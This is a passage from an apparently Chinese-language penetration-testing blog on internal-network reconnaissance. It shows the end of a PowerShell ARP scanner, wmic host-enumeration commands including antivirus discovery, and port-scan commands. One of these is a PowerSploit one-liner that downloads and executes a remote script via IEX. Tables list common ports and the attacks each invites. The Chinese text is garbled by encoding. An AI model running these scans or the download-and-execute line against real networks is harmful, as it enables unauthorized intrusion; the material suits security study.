class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">2</span>)]</span><br><span class="line">                           <span class="variable">$EndIP</span>          </span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># created by Dr. Tobias Weltner, MVP PowerShell</span></span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip1</span>)</span><br><span class="line">            <span class="variable">$ip1</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip1</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).GetAddressBytes()</span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip2</span>)</span><br><span class="line">            <span class="variable">$ip2</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$ip2</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span>)).Address</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$x</span>=<span class="variable">$ip1</span>; <span class="variable">$x</span> <span class="operator">-le</span> <span class="variable">$ip2</span>; <span class="variable">$x</span>++) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$x</span>).GetAddressBytes()</span><br><span class="line">                [<span class="built_in">Array</span>]::Reverse(<span class="variable">$ip</span>)</span><br><span class="line">                <span class="variable">$ip</span> <span class="operator">-join</span> <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">New-IPv4RangeFromCIDR</span> </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">&lt;#</span></span><br><span class="line"><span class="comment">            <span class="doctag">.Synopsis</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            <span class="doctag">.DESCRIPTION</span></span></span><br><span class="line"><span class="comment">                Generates a list of IPv4 IP Addresses given a CIDR.</span></span><br><span class="line"><span class="comment">            #&gt;</span></span><br><span class="line">            <span class="keyword">param</span>(</span><br><span class="line">                [<span class="type">Parameter</span>(<span class="type">Mandatory</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">ValueFromPipelineByPropertyName</span>=<span class="variable">$true</span>,</span><br><span class="line">                           <span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">                           <span class="variable">$Network</span></span><br><span class="line">            )</span><br><span class="line">            <span class="comment"># Extract the portions of the CIDR that will be needed</span></span><br><span class="line">            <span class="variable">$StrNetworkAddress</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">0</span>]</span><br><span class="line">            [<span class="built_in">int</span>]<span class="variable">$NetworkLength</span> = (<span class="variable">$Network</span>.split(<span class="string">&quot;/&quot;</span>))[<span class="number">1</span>]</span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StrNetworkAddress</span>).GetAddressBytes()</span><br><span class="line">            <span class="variable">$IPLength</span> = <span class="number">32</span>-<span class="variable">$NetworkLength</span></span><br><span class="line">            [<span class="built_in">Array</span>]::Reverse(<span class="variable">$NetworkIP</span>)</span><br><span class="line">            <span class="variable">$NumberOfIPs</span> = ([<span class="type">System.Math</span>]::Pow(<span class="number">2</span>, <span class="variable">$IPLength</span>)) <span class="literal">-1</span></span><br><span class="line">            <span class="variable">$NetworkIP</span> = ([<span class="type">System.Net.IPAddress</span>](<span class="variable">$NetworkIP</span> <span class="operator">-join</span> <span class="string">&quot;.&quot;</span>)).Address</span><br><span class="line">            <span class="variable">$StartIP</span> = <span class="variable">$NetworkIP</span> +<span class="number">1</span></span><br><span class="line">            <span class="variable">$EndIP</span> = <span class="variable">$NetworkIP</span> + <span class="variable">$NumberOfIPs</span></span><br><span class="line">            <span class="comment"># We make sure they are of type Double before conversion</span></span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$EndIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$EndIP</span> = <span class="variable">$EndIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">If</span> (<span class="variable">$StartIP</span> <span class="operator">-isnot</span> [<span class="built_in">double</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$StartIP</span> = <span class="variable">$StartIP</span> <span class="operator">-as</span> [<span class="built_in">double</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># We turn the start IP and end IP in to strings so they can be used.</span></span><br><span class="line">            <span class="variable">$StartIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$StartIP</span>).IPAddressToString</span><br><span class="line">            <span class="variable">$EndIP</span> = ([<span class="type">System.Net.IPAddress</span>]<span class="variable">$EndIP</span>).IPAddressToString</span><br><span class="line">            <span class="built_in">New-IPv4Range</span> <span class="variable">$StartIP</span> <span class="variable">$EndIP</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sign</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">using System;</span></span><br><span class="line"><span class="string">using System.Collections.Generic;</span></span><br><span class="line"><span class="string">using System.Text;</span></span><br><span class="line"><span class="string">using System.Net;</span></span><br><span class="line"><span class="string">using System.Net.NetworkInformation;</span></span><br><span class="line"><span class="string">using System.Runtime.InteropServices;</span></span><br><span class="line"><span class="string">public static class NetUtils</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    [System.Runtime.InteropServices.DllImport(&quot;iphlpapi.dll&quot;, ExactSpelling = true)]</span></span><br><span class="line"><span class="string">    static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);</span></span><br><span class="line"><span class="string">    public static string GetMacAddress(String addr)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        try</span></span><br><span class="line"><span class="string">                &#123;                   </span></span><br><span class="line"><span class="string">                    IPAddress IPaddr = IPAddress.Parse(addr);</span></span><br><span class="line"><span class="string">                   </span></span><br><span class="line"><span class="string">                    byte[] mac = new byte[6];</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    int L = 6;</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    SendARP(BitConverter.ToInt32(IPaddr.GetAddressBytes(), 0), 0, mac, ref L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    String macAddr = BitConverter.ToString(mac, 0, L);</span></span><br><span class="line"><span class="string">                    </span></span><br><span class="line"><span class="string">                    return (macAddr.Replace(&#x27;-&#x27;,&#x27;:&#x27;));</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                catch (Exception ex)</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    return (ex.Message);              </span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;Instanciating NetUtils&quot;</span></span><br><span class="line">            <span class="variable">$IPHlp</span> = <span class="built_in">Add-Type</span> <span class="literal">-TypeDefinition</span> <span class="variable">$sign</span> <span class="literal">-Language</span> CSharp <span class="literal">-PassThru</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Write-Verbose</span> <span class="string">&quot;NetUtils already instanciated&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if range is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$Range</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$rangeips</span> = <span class="variable">$Range</span>.Split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4Range</span> <span class="literal">-StartIP</span> <span class="variable">$rangeips</span>[<span class="number">0</span>] <span class="literal">-EndIP</span> <span class="variable">$rangeips</span>[<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Manage if CIDR is given</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$CIDR</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$targets</span> = <span class="built_in">New-IPv4RangeFromCIDR</span> <span class="literal">-Network</span> <span class="variable">$CIDR</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">Process</span> </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$scancode</span> = &#123;</span><br><span class="line">            <span class="keyword">param</span>(<span class="variable">$IPAddress</span>,<span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$IPHlp::GetMacAddress</span>(<span class="variable">$IPAddress</span>)</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;<span class="built_in">New-Object</span> psobject <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Address = <span class="variable">$IPAddress</span>; MAC = <span class="variable">$result</span>&#125;&#125;</span><br><span class="line">        &#125; <span class="comment"># end ScanCode var</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        <span class="variable">$start</span> = <span class="built_in">get-date</span></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Begin Scanning at <span class="variable">$start</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#Multithreading setup</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a pool of maxThread runspaces   </span></span><br><span class="line">        <span class="variable">$pool</span> = [<span class="type">runspacefactory</span>]::CreateRunspacePool(<span class="number">1</span>, <span class="variable">$MaxThreads</span>)   </span><br><span class="line">        <span class="variable">$pool</span>.Open()</span><br><span class="line">  </span><br><span class="line">        <span class="variable">$jobs</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$ps</span> = <span class="selector-tag">@</span>()   </span><br><span class="line">        <span class="variable">$wait</span> = <span class="selector-tag">@</span>()</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># How many servers</span></span><br><span class="line">        <span class="variable">$record_count</span> = <span class="variable">$targets</span>.Length</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Loop through the endpoints starting a background job for each endpoint</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$IPAddress</span> <span class="keyword">in</span> <span class="variable">$targets</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># Show Progress</span></span><br><span class="line">            <span class="variable">$record_progress</span> = [<span class="built_in">int</span>][<span class="type">Math</span>]::Ceiling(((<span class="variable">$i</span> / <span class="variable">$record_count</span>) * <span class="number">100</span>))</span><br><span class="line">            <span class="comment"># Write-Progress -Activity &quot;Performing ARP Scan&quot; -PercentComplete $record_progress -Status &quot;Addresses Queried - $record_progress%&quot; -Id 1;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$pool</span>.GetAvailableRunspaces()) <span class="operator">-le</span> <span class="number">0</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="comment"># create a &quot;powershell pipeline runner&quot;</span></span><br><span class="line">            <span class="variable">$ps</span> += [<span class="type">powershell</span>]::create()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># assign our pool of 3 runspaces to use   </span></span><br><span class="line">            <span class="variable">$ps</span>[<span class="variable">$i</span>].runspacepool = <span class="variable">$pool</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># command to run</span></span><br><span class="line">            [<span class="built_in">void</span>]<span class="variable">$ps</span>[<span class="variable">$i</span>].AddScript(<span class="variable">$scancode</span>).AddParameter(<span class="string">&#x27;IPaddress&#x27;</span>, <span class="variable">$IPAddress</span>).AddParameter(<span class="string">&#x27;IPHlp&#x27;</span>, <span class="variable">$IPHlp</span>)</span><br><span class="line">            <span class="comment">#[void]$ps[$i].AddParameter()</span></span><br><span class="line">    </span><br><span class="line">            <span class="comment"># start job</span></span><br><span class="line">            <span class="variable">$jobs</span> += <span class="variable">$ps</span>[<span class="variable">$i</span>].BeginInvoke();</span><br><span class="line">     </span><br><span class="line">            <span class="comment"># store wait handles for WaitForAll call   </span></span><br><span class="line">            <span class="variable">$wait</span> += <span class="variable">$jobs</span>[<span class="variable">$i</span>].AsyncWaitHandle</span><br><span class="line">    </span><br><span class="line">            <span class="variable">$i</span>++</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">write-verbose</span> <span class="string">&quot;Waiting for scanning threads to finish...&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$waitTimeout</span> = <span class="built_in">get-date</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$</span>(<span class="variable">$jobs</span> | ? &#123;<span class="variable">$_</span>.IsCompleted <span class="operator">-eq</span> <span class="variable">$false</span>&#125;).count <span class="operator">-gt</span> <span class="number">0</span> <span class="operator">-or</span> <span class="variable">$</span>(<span class="variable">$</span>(<span class="variable">$</span>(<span class="built_in">get-date</span>) - <span class="variable">$waitTimeout</span>).totalSeconds) <span class="operator">-gt</span> <span class="number">60</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">Start-Sleep</span> <span class="literal">-milliseconds</span> <span class="number">500</span></span><br><span class="line">        &#125; </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># end async call   </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> <span class="operator">-lt</span> <span class="variable">$i</span>; <span class="variable">$y</span>++) &#123;     </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> </span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="comment"># complete async job   </span></span><br><span class="line">                <span class="variable">$ScanResults</span> += <span class="variable">$ps</span>[<span class="variable">$y</span>].EndInvoke(<span class="variable">$jobs</span>[<span class="variable">$y</span>])   </span><br><span class="line">  </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">catch</span> </span><br><span class="line">            &#123;   </span><br><span class="line">       </span><br><span class="line">                <span class="built_in">write-warning</span> <span class="string">&quot;error: <span class="variable">$_</span>&quot;</span>  </span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">finally</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ps</span>[<span class="variable">$y</span>].Dispose()</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$pool</span>.Dispose()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ScanResults</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-wmicçš„ç®€å•ä½¿ç”¨"><a href="#0x03-wmicçš„ç®€å•ä½¿ç”¨" class="headerlink" title="0x03.wmicçš„ç®€å•ä½¿ç”¨"></a>0x03.wmicçš„ç®€å•ä½¿ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">wmic /?        #å…¨å±€å‚æ•°(å¸®åŠ©)</span><br><span class="line">wmic process /?        #è¿›ç¨‹å‚æ•°(å¸®åŠ©)</span><br><span class="line">wmic process get /?        #å±æ€§è·å–æ“ä½œå¸®åŠ©</span><br><span class="line">wmic process get caption,executablepath,processid    #è·å–å½“å‰è¿è¡Œè¿›ç¨‹ã€è¿›ç¨‹è·¯å¾„ã€è¿›ç¨‹id</span><br><span class="line">wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayname,productstate,pathtosignedproductexe</span><br><span class="line">wmic onboarddevice get description,devicetype,enable,status /format:list</span><br><span class="line">wmic product get name    #ç³»ç»Ÿè½¯ä»¶å®‰è£…æƒ…å†µ</span><br><span class="line">wmic environment get description,variablevalue    #æŸ¥çœ‹ç³»ç»Ÿç¯å¢ƒå˜é‡</span><br><span class="line">wmic computersystem get name,domain,manufacturer,model,username,roles/format:list</span><br><span class="line">wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list</span><br></pre></td></tr></table></figure><h2 id="0x04-åŸŸå†…ç«¯å£æ¢æµ‹"><a href="#0x04-åŸŸå†…ç«¯å£æ¢æµ‹" class="headerlink" title="0x04.åŸŸå†…ç«¯å£æ¢æµ‹"></a>0x04.åŸŸå†…ç«¯å£æ¢æµ‹</h2><h3 id="01-scanlineTCP-UDPç«¯å£æ¢æµ‹"><a href="#01-scanlineTCP-UDPç«¯å£æ¢æµ‹" class="headerlink" title="01.scanlineTCP/UDPç«¯å£æ¢æµ‹"></a>01.scanlineTCP/UDPç«¯å£æ¢æµ‹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scanline.exe -h -t 22,80-89,110,389,1099,1433,2059,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O C:\Users\Administrator\Desktop\log.txt -p 10.10.10.1-254</span><br></pre></td></tr></table></figure><h3 id="02-telnetæ‰«æ"><a href="#02-telnetæ‰«æ" class="headerlink" title="02.telnetæ‰«æ"></a>02.telnetæ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.10 22</span><br></pre></td></tr></table></figure><h3 id="03-metasploitç«¯å£æ‰«æ"><a href="#03-metasploitç«¯å£æ‰«æ" class="headerlink" title="03.metasploitç«¯å£æ‰«æ"></a>03.metasploitç«¯å£æ‰«æ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set rhosts 192.168.1.1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="04-PowerSploitçš„Invoke-Portscan-ps1"><a href="#04-PowerSploitçš„Invoke-Portscan-ps1" class="headerlink" title="04.PowerSploitçš„Invoke-Portscan.ps1"></a>04.PowerSploitçš„Invoke-Portscan.ps1</h3><p><code>æ— æ–‡ä»¶æ‰«æ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 10.10.10.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA c:\user\administrator\desktop\res.txt&quot;</span><br></pre></td></tr></table></figure><h2 id="0x05-åŸŸå†…å¸¸è§ç«¯å£"><a href="#0x05-åŸŸå†…å¸¸è§ç«¯å£" class="headerlink" title="0x05.åŸŸå†…å¸¸è§ç«¯å£"></a>0x05.åŸŸå†…å¸¸è§ç«¯å£</h2><h3 id="01-æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£"><a href="#01-æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£" class="headerlink" title="01.æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£"></a>01.æ–‡ä»¶å…±äº«æœåŠ¡ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>21ã€22ã€69</td><td>FTP/TFTPæ–‡ä»¶ä¼ è¾“åè®®</td><td>å…è®¸åŒ¿åçš„ä¸Šä¼ ã€ä¸‹è½½çˆ†ç ´å’Œå—…æ¢æ“ä½œ</td></tr><tr><td>2049</td><td>NFSæœåŠ¡</td><td>é…ç½®ä¸å½“</td></tr><tr><td>137ã€138ã€139</td><td>Netbiso/SAMBAæœåŠ¡</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®ã€è¿œç¨‹ä»£ç æ‰§è¡Œ</td></tr><tr><td>389</td><td>LDAPç›®å½•è®¿é—®åè®®</td><td>æ³¨å…¥ã€å…è®¸åŒ¿åè®¿é—®ã€å¼±å£ä»¤</td></tr><tr><td>135</td><td>DCOM/RPCæœåŠ¡</td><td>RPCé€šä¿¡æ¡¥æ¢</td></tr><tr><td>445</td><td>SMB</td><td>å…±äº«æ–‡ä»¶å¤¹(MS17-010),IPC$æœåŠ¡</td></tr></tbody></table><h3 id="02-è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"><a href="#02-è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£" class="headerlink" title="02.è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£"></a>02.è¿œç¨‹è¿æ¥æœåŠ¡ç«¯å£</h3><table><thead><tr><th align="left">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td align="left">22</td><td>SSHè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€SSHéš§é“åŠå†…ç½‘ä»£ç†è½¬å‘ã€æ–‡ä»¶ä¼ è¾“</td></tr><tr><td align="left">23</td><td>Telnetè¿œç¨‹è¿æ¥</td><td>çˆ†ç ´ã€å—…æ¢ã€å¼±å£ä»¤</td></tr><tr><td align="left">3389</td><td>RDPè¿œç¨‹æ¡Œé¢è¿æ¥</td><td>Shiftåé—¨ï¼ˆWindows Server 2003ä»¥ä¸‹ç‰ˆæœ¬ï¼‰ã€çˆ†ç ´</td></tr><tr><td align="left">5900</td><td>VNC</td><td>å¼±å£ä»¤çˆ†ç ´</td></tr><tr><td align="left">5632</td><td>PcAnywhereæœåŠ¡</td><td>æŠ“å–å¯†ç ã€ä»£ç æ‰§è¡Œ</td></tr></tbody></table><h3 id="03-Webåº”ç”¨æœåŠ¡ç«¯å£"><a href="#03-Webåº”ç”¨æœåŠ¡ç«¯å£" class="headerlink" title="03.Webåº”ç”¨æœåŠ¡ç«¯å£"></a>03.Webåº”ç”¨æœåŠ¡ç«¯å£</h3><table><thead><tr><th align="left">ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td align="left">80ã€443ã€8080</td><td>å¸¸è§çš„WebæœåŠ¡ç«¯å£</td><td>Webæ”»å‡»ã€çˆ†ç ´ã€å¯¹åº”æœåŠ¡å™¨ç‰ˆæœ¬æ¼æ´</td></tr><tr><td align="left">7001ã€7002</td><td>Weblogicæ§åˆ¶å°</td><td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td></tr><tr><td align="left">8080ã€8089</td><td>JBoss/Resin/Jetty/Jenkins</td><td>ååºåˆ—åŒ–ã€æ§åˆ¶å°å¼±å£ä»¤</td></tr><tr><td align="left">9090</td><td>WebSphereæ§åˆ¶å°</td><td>Javaååºåˆ—åŒ–ã€å¼±å£ä»¤</td></tr><tr><td align="left">4848</td><td>GlassFishæ§åˆ¶å°</td><td>å¼±å£ä»¤</td></tr><tr><td align="left">1352</td><td>Lotus Dominoé‚®ä»¶æœåŠ¡</td><td>å¼±å£ä»¤ã€ä¿¡æ¯æ³„éœ²ã€çˆ†ç ´</td></tr><tr><td align="left">10000</td><td>webminæ§åˆ¶é¢æ¿</td><td>å¼±å£ä»¤</td></tr></tbody></table><h3 id="04-æ•°æ®åº“æœåŠ¡ç«¯å£"><a href="#04-æ•°æ®åº“æœåŠ¡ç«¯å£" class="headerlink" title="04.æ•°æ®åº“æœåŠ¡ç«¯å£"></a>04.æ•°æ®åº“æœåŠ¡ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th><strong>ä½¿ç”¨è¯´æ˜</strong></th></tr></thead><tbody><tr><td>3306</td><td>MySQLæ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€çˆ†ç ´</td></tr><tr><td>1433</td><td>MSSQLæ•°æ®åº“</td><td>æ³¨å…¥ã€ææƒã€SAå¼±å£ä»¤ã€çˆ†ç ´</td></tr><tr><td>1521</td><td>Oracleæ•°æ®åº“</td><td>TNSçˆ†ç ´ã€æ³¨å…¥ã€åå¼¹Shell</td></tr><tr><td>5432</td><td>PostgreSQLæ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥ã€å¼±å£ä»¤</td></tr><tr><td>27017ã€27018</td><td>MongoDBæ•°æ®åº“</td><td>çˆ†ç ´ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>6379</td><td>Redisæ•°æ®åº“</td><td>æœªæˆæƒè®¿é—®ã€å¼±å£ä»¤</td></tr><tr><td>5000</td><td>Sysbase/DB2æ•°æ®åº“</td><td>çˆ†ç ´ã€æ³¨å…¥</td></tr></tbody></table><h3 id="05-é‚®ä»¶æœåŠ¡å™¨ç«¯å£"><a href="#05-é‚®ä»¶æœåŠ¡å™¨ç«¯å£" class="headerlink" title="05.é‚®ä»¶æœåŠ¡å™¨ç«¯å£"></a>05.é‚®ä»¶æœåŠ¡å™¨ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>25</td><td>SMTPé‚®ä»¶æœåŠ¡</td><td>é‚®ä»¶ä¼ªé€ </td></tr><tr><td>110</td><td>POP3åè®®</td><td>çˆ†ç ´ã€å—…æ¢</td></tr><tr><td>143</td><td>IMAPåè®®</td><td>çˆ†ç ´</td></tr></tbody></table><h3 id="06-ç½‘ç»œå¸¸è§åè®®ç«¯å£"><a href="#06-ç½‘ç»œå¸¸è§åè®®ç«¯å£" class="headerlink" title="06.ç½‘ç»œå¸¸è§åè®®ç«¯å£"></a>06.ç½‘ç»œå¸¸è§åè®®ç«¯å£</h3><table><thead><tr><th>ç«¯å£å·</th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>53</td><td>DNSåŸŸåç³»ç»Ÿ</td><td>å…è®¸åŒºåŸŸä¼ é€ã€DNSåŠ«æŒã€ç¼“å­˜æŠ•æ¯’ã€æ¬ºéª—</td></tr><tr><td>67ã€68</td><td>DHCPæœåŠ¡</td><td>åŠ«æŒã€æ¬ºéª—</td></tr><tr><td>161</td><td>SNMPåè®®</td><td>çˆ†ç ´ã€æœé›†ç›®æ ‡å†…ç½‘ä¿¡æ¯</td></tr></tbody></table><h3 id="07-ç‰¹æ®ŠæœåŠ¡ç«¯å£"><a href="#07-ç‰¹æ®ŠæœåŠ¡ç«¯å£" class="headerlink" title="07.ç‰¹æ®ŠæœåŠ¡ç«¯å£"></a>07.ç‰¹æ®ŠæœåŠ¡ç«¯å£</h3><table><thead><tr><th><strong>ç«¯å£å·</strong></th><th>ç«¯å£è¯´æ˜</th><th>ä½¿ç”¨è¯´æ˜</th></tr></thead><tbody><tr><td>2181</td><td>ZooKeeperæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>8069</td><td>ZabbixæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œã€SQLæ³¨å…¥</td></tr><tr><td>9200ã€9300</td><td>ElasticsearchæœåŠ¡</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>11211</td><td>MemchachedæœåŠ¡</td><td>æœªæˆæƒè®¿é—®</td></tr><tr><td>512ã€513ã€514</td><td>Linux rexecæœåŠ¡</td><td>çˆ†ç ´ã€è¿œç¨‹ç™»å½•</td></tr><tr><td>873</td><td>rsyncæœåŠ¡</td><td>åŒ¿åè®¿é—®ã€æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td>3690</td><td>SVNæœåŠ¡</td><td>svnæ³„éœ²ã€æœªæˆæƒè®¿é—®</td></tr><tr><td>50000</td><td>SAP Management Console</td><td>è¿œç¨‹æ‰§è¡Œ</td></tr><tr><td>88</td><td>KerberosæœåŠ¡</td><td>ç›‘å¬KDCç¥¨æ®è¯·æ±‚ï¼Œç¥¨æ®ä¼ªé€ </td></tr><tr><td>5985</td><td>WinRM</td><td>HTTP/HTTPSç›‘å¬</td></tr></tbody></table><h2 